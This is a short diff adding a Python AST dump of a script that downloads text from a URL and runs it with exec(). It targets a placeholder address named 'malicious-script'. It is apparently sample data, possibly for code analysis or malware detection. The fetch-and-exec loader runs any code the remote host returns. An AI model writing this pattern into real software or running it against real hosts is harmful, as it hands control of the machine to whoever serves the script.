@@ -1,0 +1,65 @@
+Module(
+    body=[
+        Import(
+            names=[
+                alias(name='requests')]),
+        FunctionDef(
+            name='fetch_and_execute_url',
+            args=arguments(
+                posonlyargs=[],
+                args=[
+                    arg(arg='url')],
+                kwonlyargs=[],
+                kw_defaults=[],
+                defaults=[]),
+            body=[
+                Assign(
+                    targets=[
+                        Name(id='response', ctx=Store())],
+                    value=Call(
+                        func=Attribute(
+                            value=Name(id='requests', ctx=Load()),
+                            attr='get',
+                            ctx=Load()),
+                        args=[
+                            Name(id='url', ctx=Load())],
+                        keywords=[])),
+                If(
+                    test=Compare(
+                        left=Attribute(
+                            value=Name(id='response', ctx=Load()),
+                            attr='status_code',
+                            ctx=Load()),
+                        ops=[
+                            Eq()],
+                        comparators=[
+                            Constant(value=200)]),
+                    body=[
+                        Expr(
+                            value=Call(
+                                func=Name(id='exec', ctx=Load()),
+                                args=[
+                                    Attribute(
+                                        value=Name(id='response', ctx=Load()),
+                                        attr='text',
+                                        ctx=Load())],
+                                keywords=[]))],
+                    orelse=[
+                        Expr(
+                            value=Call(
+                                func=Name(id='print', ctx=Load()),
+                                args=[
+                                    Constant(value='Failed to fetch URL')],
+                                keywords=[]))])],
+            decorator_list=[]),
+        Assign(
+            targets=[
+                Name(id='url', ctx=Store())],
+            value=Constant(value='https://example.com/malicious-script')),
+        Expr(
+            value=Call(
+                func=Name(id='fetch_and_execute_url', ctx=Load()),
+                args=[
+                    Name(id='url', ctx=Load())],
+                keywords=[]))],
+    type_ignores=[])
